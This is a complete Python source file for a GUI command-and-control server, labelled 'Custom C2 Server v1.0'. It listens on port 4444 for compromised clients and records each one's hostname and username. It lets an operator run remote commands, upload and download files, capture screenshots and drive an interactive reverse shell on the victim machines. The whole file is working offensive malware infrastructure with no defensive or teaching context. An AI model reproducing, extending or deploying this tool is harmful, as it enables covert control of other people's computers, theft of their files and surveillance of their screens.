import socket
import threading
import os
import time
import base64
from datetime import datetime
import tkinter as tk
from tkinter import ttk, scrolledtext, filedialog, messagebox
import sys
import queue

class C2ServerBackend:
    def __init__(self, host='0.0.0.0', port=4444, message_callback=None, client_callback=None):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.clients = {}  
        self.current_client = None
        self.message_callback = message_callback
        self.client_callback = client_callback   
        self.running = False
        self.command_queue = queue.Queue()
        self.response_queue = queue.Queue()
        
    def start_server(self):
        """Start the C2 server"""
        try:
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True
            
            if self.message_callback:
                self.message_callback(f"[+] C2 Server started on {self.host}:{self.port}")
                self.message_callback("[+] Waiting for incoming connections...")
            
            
            threading.Thread(target=self.accept_connections, daemon=True).start()
            
            return True
        except Exception as e:
            if self.message_callback:
                self.message_callback(f"[!] Server error: {e}")
            return False
    
    def stop_server(self):
        """Stop the C2 server"""
        self.running = False
        
        for client_id, client_info in list(self.clients.items()):
            try:
                client_info['socket'].sendall("disconnect".encode())
                client_info['socket'].close()
            except:
                pass
        
        try:
            self.server_socket.close()
        except:
            pass
        
        if self.message_callback:
            self.message_callback("[+] C2 server shutdown complete.")
    
    def accept_connections(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, address = self.server_socket.accept()
                if self.message_callback:
                    self.message_callback(f"[+] Connection from {address[0]}:{address[1]} - waiting for client info...")
                
                client_socket.settimeout(10)
                hostname = client_socket.recv(1024).decode('utf-8', errors='ignore')
                username = client_socket.recv(1024).decode('utf-8', errors='ignore')
                
                client_id = f"{len(self.clients) + 1}"
                
                self.clients[client_id] = {
                    'socket': client_socket,
                    'address': address,
                    'hostname': hostname,
                    'username': username,
                    'connected_time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                }
                
                if self.message_callback:
                    self.message_callback(f"[+] New connection from {address[0]}:{address[1]} ({hostname}/{username}) - ID: {client_id}")
                
                try:
                    client_socket.sendall("Connection established with C2 server.".encode())
                except:
                    if self.message_callback:
                        self.message_callback(f"[!] Error sending acknowledgement to client {client_id}")
                
                if self.client_callback:
                    self.client_callback()
                    
            except socket.timeout:
                if self.message_callback:
                    self.message_callback(f"[!] Client connection timed out while waiting for information")
                try:
                    client_socket.close()
                except:
                    pass
            except Exception as e:
                if not self.running:
                    break
                if self.message_callback:
                    self.message_callback(f"[!] Error accepting connection: {e}")
    
    def get_clients(self):
        """Return the list of connected clients"""
        return self.clients
    
    def select_client(self, client_id):
        """Select a client to interact with"""
        if client_id not in self.clients:
            if self.message_callback:
                self.message_callback(f"[!] Client ID {client_id} not found.")
            return False
        
        try:
            self.clients[client_id]['socket'].settimeout(5)
            self.clients[client_id]['socket'].sendall("ping".encode())
            response = self.clients[client_id]['socket'].recv(1024)
        except:
            if self.message_callback:
                self.message_callback(f"[!] Client {client_id} appears to be disconnected.")
            self._remove_client(client_id)
            return False
        
        self.current_client = client_id
        hostname = self.clients[client_id]['hostname']
        
        if self.message_callback:
            self.message_callback(f"[+] Now interacting with {hostname} (ID: {client_id})")
        
        return True
    
    def execute_command(self, command, args=""):
        """Execute a command on the selected client"""
        try:
            if not self.current_client:
                if self.message_callback:
                    self.message_callback("[!] No client selected.")
                return False
            
            client_socket = self.clients[self.current_client]['socket']
            full_command = f"{command} {args}".strip()
            
            if self.message_callback:
                self.message_callback(f"[*] Sending command: {full_command}")
            
            client_socket.sendall(full_command.encode())
            
            if command not in ['shell']:
                client_socket.settimeout(30)  
                response = client_socket.recv(4096)
                if self.message_callback:
                    self.message_callback(response.decode('utf-8', errors='ignore'))
                
            return True
            
        except socket.timeout:
            if self.message_callback:
                self.message_callback(f"[!] Command timed out. Client may be busy or unresponsive.")
            return False
        except Exception as e:
            if self.message_callback:
                self.message_callback(f"[!] Error sending command: {e}")
            self._remove_client(self.current_client)
            return False
    
    def upload_file(self, src_path, dst_path):
        """Upload a file to the client"""
        try:
            if not self.current_client:
                if self.message_callback:
                    self.message_callback("[!] No client selected.")
                return False
                
            if not os.path.isfile(src_path):
                if self.message_callback:
                    self.message_callback(f"[!] Source file '{src_path}' not found.")
                return False
                
            client_socket = self.clients[self.current_client]['socket']
            client_socket.sendall(f"upload {dst_path}".encode())
            
            client_socket.settimeout(10)
            response = client_socket.recv(1024).decode()
            if response != "READY":
                if self.message_callback:
                    self.message_callback(f"[!] Client error: {response}")
                return False
            
            with open(src_path, 'rb') as file:
                file_data = file.read()
                
            client_socket.sendall(str(len(file_data)).encode())
            time.sleep(0.5) 
            
            response = client_socket.recv(1024).decode()
            if response != "READY":
                if self.message_callback:
                    self.message_callback(f"[!] Client error: {response}")
                return False
                
            client_socket.sendall(file_data)
            
            client_socket.settimeout(30)  
            response = client_socket.recv(1024).decode()
            if self.message_callback:
                self.message_callback(response)
            
            return True
            
        except Exception as e:
            if self.message_callback:
                self.message_callback(f"[!] Upload error: {e}")
            return False
    
    def download_file(self, src_path, dst_path):
        """Download a file from the client"""
        try:
            if not self.current_client:
                if self.message_callback:
                    self.message_callback("[!] No client selected.")
                return False
            
            client_socket = self.clients[self.current_client]['socket']
            client_socket.sendall(f"download {src_path}".encode())
            
            client_socket.settimeout(10)
            response = client_socket.recv(1024).decode()
            if response.startswith("ERROR"):
                if self.message_callback:
                    self.message_callback(f"[!] {response}")
                return False
                
            file_size = int(response)
            client_socket.sendall("READY".encode())
            
            file_data = b""
            remaining = file_size
            client_socket.settimeout(60) 
            
            while remaining > 0:
                chunk = client_socket.recv(min(4096, remaining))
                if not chunk:
                    break
                file_data += chunk
                remaining -= len(chunk)
            
            with open(dst_path, 'wb') as file:
                file.write(file_data)
            
            if self.message_callback:
                self.message_callback(f"[+] File downloaded successfully and saved to '{dst_path}' ({file_size} bytes)")
            
            return True
            
        except Exception as e:
            if self.message_callback:
                self.message_callback(f"[!] Download error: {e}")
            return False
    
    def take_screenshot(self, save_path):
        """Take a screenshot on the client machine"""
        try:
            if not self.current_client:
                if self.message_callback:
                    self.message_callback("[!] No client selected.")
                return False
                
            client_socket = self.clients[self.current_client]['socket']
            client_socket.sendall(f"screenshot".encode())
            
            client_socket.settimeout(30) 
            response = client_socket.recv(1024).decode()
            if response.startswith("ERROR"):
                if self.message_callback:
                    self.message_callback(f"[!] {response}")
                return False
                
            screenshot_size = int(response)
            client_socket.sendall("READY".encode())
            
            screenshot_data = b""
            remaining = screenshot_size
            client_socket.settimeout(60)  
            
            while remaining > 0:
                chunk = client_socket.recv(min(4096, remaining))
                if not chunk:
                    break
                screenshot_data += chunk
                remaining -= len(chunk)
            
            with open(save_path, 'wb') as file:
                file.write(screenshot_data)
                
            if self.message_callback:
                self.message_callback(f"[+] Screenshot saved to '{save_path}' ({screenshot_size} bytes)")
            
            return True
            
        except Exception as e:
            if self.message_callback:
                self.message_callback(f"[!] Screenshot error: {e}")
            return False
    
    def start_shell(self):
        """Start a reverse shell session with the client"""
        if not self.current_client:
            if self.message_callback:
                self.message_callback("[!] No client selected.")
            return False
            
        client_socket = self.clients[self.current_client]['socket']
        client_socket.sendall("shell".encode())
        
        if self.message_callback:
            self.message_callback("[+] Starting reverse shell session. Enter commands in the command line below.")
        
        return True
    
    def send_shell_command(self, command):
        """Send a command in shell mode"""
        try:
            if not self.current_client:
                if self.message_callback:
                    self.message_callback("[!] No client selected.")
                return False
                
            client_socket = self.clients[self.current_client]['socket']
            
            if command.lower() == "exit":
                client_socket.sendall("exit_shell".encode())
                if self.message_callback:
                    self.message_callback("[+] Exiting shell mode")
                return False
                
            client_socket.sendall(command.encode())
            
            client_socket.settimeout(30)  
            response = client_socket.recv(4096).decode('utf-8', errors='ignore')
            if self.message_callback:
                self.message_callback(response)
            
            return True
            
        except Exception as e:
            if self.message_callback:
                self.message_callback(f"[!] Shell error: {e}")
            return False
    
    def exit_client(self):
        """Exit the current client session"""
        if not self.current_client:
            if self.message_callback:
                self.message_callback("[!] No client currently selected.")
            return False
            
        client_id = self.current_client
        self.current_client = None
        
        if self.message_callback:
            self.message_callback(f"[+] Exiting session with client {client_id}")
        
        return True
    
    def _remove_client(self, client_id):
        """Remove a disconnected client"""
        if client_id in self.clients:
            try:
                self.clients[client_id]['socket'].close()
            except:
                pass
            
            del self.clients[client_id]
            
            if self.message_callback:
                self.message_callback(f"[!] Client {client_id} has been removed (disconnected).")
            
            if self.current_client == client_id:
                self.current_client = None
                
            if self.client_callback:
                self.client_callback()


class C2ServerGUI:
    def __init__(self, root):
        self.root = root
        root.title("Custom C2 Server")
        root.geometry("1000x700")
        root.minsize(800, 600)
        
        self.server_running = False
        self.shell_mode = False
        
        self.server = C2ServerBackend(message_callback=self.add_log, client_callback=self.update_client_list)
        
        self.main_frame = ttk.Frame(root)
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.create_server_control_section()
        self.create_client_list_section()
        self.create_command_section()
        self.create_log_section()
        
        self.style = ttk.Style()
        self.style.configure("TButton", padding=6, relief="flat", background="#ccc")
        self.style.configure("TFrame", background="#f0f0f0")
        
        root.protocol("WM_DELETE_WINDOW", self.on_closing)
    
    def create_server_control_section(self):
        """Create the server control section"""
        server_frame = ttk.LabelFrame(self.main_frame, text="Server Control")
        server_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(server_frame, text="Host:").grid(row=0, column=0, padx=5, pady=5)
        self.host_entry = ttk.Entry(server_frame)
        self.host_entry.insert(0, "0.0.0.0")
        self.host_entry.grid(row=0, column=1, padx=5, pady=5, sticky="w")
        
        ttk.Label(server_frame, text="Port:").grid(row=0, column=2, padx=5, pady=5)
        self.port_entry = ttk.Entry(server_frame, width=6)
        self.port_entry.insert(0, "4444")
        self.port_entry.grid(row=0, column=3, padx=5, pady=5, sticky="w")
        
        self.server_button = ttk.Button(server_frame, text="Start Server", command=self.toggle_server)
        self.server_button.grid(row=0, column=4, padx=5, pady=5, sticky="e")
        
        self.status_label = ttk.Label(server_frame, text="Server Status: Stopped")
        self.status_label.grid(row=0, column=5, padx=5, pady=5, sticky="e")
        
        server_frame.columnconfigure(1, weight=1)
        server_frame.columnconfigure(3, weight=0)
        server_frame.columnconfigure(4, weight=0)
        server_frame.columnconfigure(5, weight=1)
    
    def create_client_list_section(self):
        """Create the client list section"""
        client_frame = ttk.LabelFrame(self.main_frame, text="Connected Clients")
        client_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.client_tree = ttk.Treeview(client_frame, columns=("id", "ip", "port", "hostname", "username", "connected"), show="headings")
        self.client_tree.heading("id", text="ID")
        self.client_tree.heading("ip", text="IP Address")
        self.client_tree.heading("port", text="Port")
        self.client_tree.heading("hostname", text="Hostname")
        self.client_tree.heading("username", text="Username")
        self.client_tree.heading("connected", text="Connected Time")
        
        self.client_tree.column("id", width=30, anchor="center")
        self.client_tree.column("ip", width=100)
        self.client_tree.column("port", width=50, anchor="center")
        self.client_tree.column("hostname", width=150)
        self.client_tree.column("username", width=100)
        self.client_tree.column("connected", width=150)
        
        client_scrollbar = ttk.Scrollbar(client_frame, orient="vertical", command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=client_scrollbar.set)
        
        self.client_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        client_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.client_tree.bind("<Double-1>", self.on_client_select)
        
        btn_frame = ttk.Frame(client_frame)
        btn_frame.pack(fill=tk.X, pady=5)
        
        self.select_btn = ttk.Button(btn_frame, text="Select Client", command=self.select_client)
        self.select_btn.pack(side=tk.LEFT, padx=5)
        
        self.refresh_btn = ttk.Button(btn_frame, text="Refresh List", command=self.update_client_list)
        self.refresh_btn.pack(side=tk.LEFT, padx=5)
    
    def create_command_section(self):
        """Create the command section"""
        command_frame = ttk.LabelFrame(self.main_frame, text="Command Control")
        command_frame.pack(fill=tk.X, pady=(0, 10))
        
        self.command_tabs = ttk.Notebook(command_frame)
        self.command_tabs.pack(fill=tk.BOTH, expand=True)
        
        basic_cmd_tab = ttk.Frame(self.command_tabs)
        self.command_tabs.add(basic_cmd_tab, text="Basic Commands")
        
        ttk.Label(basic_cmd_tab, text="Command:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.cmd_entry = ttk.Entry(basic_cmd_tab, width=50)
        self.cmd_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.cmd_entry.bind("<Return>", lambda event: self.send_command())
        
        cmd_btn = ttk.Button(basic_cmd_tab, text="Execute", command=self.send_command)
        cmd_btn.grid(row=0, column=2, padx=5, pady=5)
        
        basic_cmd_tab.columnconfigure(1, weight=1)
        
        file_op_tab = ttk.Frame(self.command_tabs)
        self.command_tabs.add(file_op_tab, text="File Operations")
        
        ttk.Label(file_op_tab, text="Upload File:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.upload_src_entry = ttk.Entry(file_op_tab, width=30)
        self.upload_src_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        upload_browse_btn = ttk.Button(file_op_tab, text="Browse", command=lambda: self.browse_file(self.upload_src_entry))
        upload_browse_btn.grid(row=0, column=2, padx=5, pady=5)
        
        ttk.Label(file_op_tab, text="Destination:").grid(row=0, column=3, padx=5, pady=5, sticky="w")
        self.upload_dst_entry = ttk.Entry(file_op_tab, width=30)
        self.upload_dst_entry.grid(row=0, column=4, padx=5, pady=5, sticky="ew")
        
        upload_btn = ttk.Button(file_op_tab, text="Upload", command=self.upload_file)
        upload_btn.grid(row=0, column=5, padx=5, pady=5)
        
        ttk.Separator(file_op_tab, orient="horizontal").grid(row=1, column=0, columnspan=6, sticky="ew", pady=5)
        
        ttk.Label(file_op_tab, text="Download File:").grid(row=2, column=0, padx=5, pady=5, sticky="w")
        self.download_src_entry = ttk.Entry(file_op_tab, width=30)
        self.download_src_entry.grid(row=2, column=1, padx=5, pady=5, sticky="ew")
        
        ttk.Label(file_op_tab, text="Destination:").grid(row=2, column=3, padx=5, pady=5, sticky="w")
        self.download_dst_entry = ttk.Entry(file_op_tab, width=30)
        self.download_dst_entry.grid(row=2, column=4, padx=5, pady=5, sticky="ew")
        
        download_browse_btn = ttk.Button(file_op_tab, text="Browse", command=lambda: self.browse_file(self.download_dst_entry, save=True))
        download_browse_btn.grid(row=2, column=2, padx=5, pady=5)
        
        download_btn = ttk.Button(file_op_tab, text="Download", command=self.download_file)
        download_btn.grid(row=2, column=5, padx=5, pady=5)
        
        file_op_tab.columnconfigure(1, weight=1)
        file_op_tab.columnconfigure(4, weight=1)
        
        screenshot_tab = ttk.Frame(self.command_tabs)
        self.command_tabs.add(screenshot_tab, text="Screenshot")
        
        ttk.Label(screenshot_tab, text="Save Path:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.screenshot_path_entry = ttk.Entry(screenshot_tab, width=50)
        default_ss_path = os.path.join(os.path.expanduser("~"), "Desktop", f"screenshot_{int(time.time())}.png")
        self.screenshot_path_entry.insert(0, default_ss_path)
        self.screenshot_path_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        
        screenshot_browse_btn = ttk.Button(screenshot_tab, text="Browse", command=lambda: self.browse_file(self.screenshot_path_entry, save=True))
        screenshot_browse_btn.grid(row=0, column=2, padx=5, pady=5)
        
        screenshot_btn = ttk.Button(screenshot_tab, text="Take Screenshot", command=self.take_screenshot)
        screenshot_btn.grid(row=1, column=1, padx=5, pady=5)
        
        screenshot_tab.columnconfigure(1, weight=1)
        
        shell_tab = ttk.Frame(self.command_tabs)
        self.command_tabs.add(shell_tab, text="Shell")
        
        ttk.Label(shell_tab, text="Shell Command:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.shell_cmd_entry = ttk.Entry(shell_tab, width=50)
        self.shell_cmd_entry.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        self.shell_cmd_entry.bind("<Return>", lambda event: self.send_shell_command())
        
        shell_cmd_btn = ttk.Button(shell_tab, text="Execute", command=self.send_shell_command)
        shell_cmd_btn.grid(row=0, column=2, padx=5, pady=5)
        
        shell_start_btn = ttk.Button(shell_tab, text="Start Shell Session", command=self.start_shell)
        shell_start_btn.grid(row=1, column=0, padx=5, pady=5)
        
        shell_exit_btn = ttk.Button(shell_tab, text="Exit Shell", command=self.exit_shell)
        shell_exit_btn.grid(row=1, column=1, padx=5, pady=5, sticky="w")
        
        shell_tab.columnconfigure(1, weight=1)
    
    def create_log_section(self):
        """Create the log section"""
        log_frame = ttk.LabelFrame(self.main_frame, text="Server Log")
        log_frame.pack(fill=tk.BOTH, expand=True)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, width=80, height=10)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        self.log_text.config(state=tk.DISABLED)
        
        self.add_log("""
    ╔════════════════════════════════════════════════╗
    ║            Custom C2 Server v1.0 GUI           ║
    ╚════════════════════════════════════════════════╝
    
    Welcome to the Custom C2 Server GUI!
    
    1. Click "Start Server" to begin listening for connections
    2. Once clients connect, they will appear in the client list
    3. Double-click a client or use "Select Client" to interact with it
    4. Use the command tabs to send commands to the selected client
        """)
    
    def add_log(self, message):
        """Add a message to the log"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, f"{message}\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)
    
    def toggle_server(self):
        """Start or stop the server"""
        if not self.server_running:
            try:
                host = self.host_entry.get()
                port = int(self.port_entry.get())
                
                self.server.host = host
                self.server.port = port
                
                if self.server.start_server():
                    self.server_running = True
                    self.server_button.config(text="Stop Server")
                    self.status_label.config(text=f"Server Status: Running on {host}:{port}")
                    
                    self.host_entry.config(state="disabled")
                    self.port_entry.config(state="disabled")
            except Exception as e:
                self.add_log(f"[!] Error starting server: {e}")
        else:
            self.server.stop_server()
            self.server_running = False
            self.server_button.config(text="Start Server")
            self.status_label.config(text="Server Status: Stopped")
            
            self.host_entry.config(state="normal")
            self.port_entry.config(state="normal")
            
            for item in self.client_tree.get_children():
                self.client_tree.delete(item)
    
    def update_client_list(self):
        """Update the client list in the GUI"""
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        
        for client_id, client_info in self.server.get_clients().items():
            ip, port = client_info['address']
            self.client_tree.insert("", "end", values=(
                client_id,
                ip,
                port,
                client_info['hostname'],
                client_info['username'],
                client_info['connected_time']
            ))
    
    def on_client_select(self, event):
        """Handle double-click on client list"""
        self.select_client()
    
    def select_client(self):
        """Select a client from the list"""
        selection = self.client_tree.selection()
        if not selection:
            self.add_log("[!] No client selected from the list.")
            return
        
        item = selection[0]
        client_id = self.client_tree.item(item, "values")[0]
        
        if self.server.select_client(client_id):
            for item in self.client_tree.get_children():
                values = self.client_tree.item(item, "values")
                if values[0] == client_id:
                    self.client_tree.selection_set(item)
                    self.client_tree.focus(item)
    
    def browse_file(self, entry_widget, save=False):
        """Browse for a file and update the entry widget"""
        if save:
            path = filedialog.asksaveasfilename()
        else:
            path = filedialog.askopenfilename()
        
        if path:
            entry_widget.delete(0, tk.END)
            entry_widget.insert(0, path)
    
    def send_command(self):
        """Send a command to the selected client"""
        command = self.cmd_entry.get().strip()
        if not command:
            return
        
        if " " in command:
            cmd_parts = command.split(" ", 1)
            cmd = cmd_parts[0]
            args = cmd_parts[1]
        else:
            cmd = command
            args = ""
        
        self.server.execute_command(cmd, args)
        self.cmd_entry.delete(0, tk.END)
    
    def upload_file(self):
        """Upload a file to the selected client"""
        src_path = self.upload_src_entry.get().strip()
        dst_path = self.upload_dst_entry.get().strip()
        
        if not src_path or not dst_path:
            self.add_log("[!] Please provide both source and destination paths.")
            return
        
        self.server.upload_file(src_path, dst_path)
    
    def download_file(self):
        """Download a file from the selected client"""
        src_path = self.download_src_entry.get().strip()
        dst_path = self.download_dst_entry.get().strip()
        
        if not src_path or not dst_path:
            self.add_log("[!] Please provide both source and destination paths.")
            return
        
        self.server.download_file(src_path, dst_path)
    
    def take_screenshot(self):
        """Take a screenshot on the selected client"""
        save_path = self.screenshot_path_entry.get().strip()
        
        if not save_path:
            save_path = os.path.join(os.path.expanduser("~"), "Desktop", f"screenshot_{int(time.time())}.png")
            self.screenshot_path_entry.delete(0, tk.END)
            self.screenshot_path_entry.insert(0, save_path)
        
        self.server.take_screenshot(save_path)
    
    def start_shell(self):
        """Start a shell session with the selected client"""
        if self.server.start_shell():
            self.shell_mode = True
            self.command_tabs.select(3)  
    
    def send_shell_command(self):
        """Send a shell command to the selected client"""
        command = self.shell_cmd_entry.get().strip()
        if not command:
            return
        
        if not self.shell_mode:
            self.add_log("[!] Shell session not active. Start a shell session first.")
            return
        
        self.server.send_shell_command(command)
        self.shell_cmd_entry.delete(0, tk.END)
        
        if command.lower() == "exit":
            self.shell_mode = False
    
    def exit_shell(self):
        """Exit the shell session"""
        if self.shell_mode:
            self.server.send_shell_command("exit")
            self.shell_mode = False
    
    def on_closing(self):
        """Handle window closing"""
        if self.server_running:
            if messagebox.askokcancel("Quit", "The server is still running. Do you want to stop it and exit?"):
                self.server.stop_server()
                self.root.destroy()
        else:
            self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = C2ServerGUI(root)
    root.mainloop()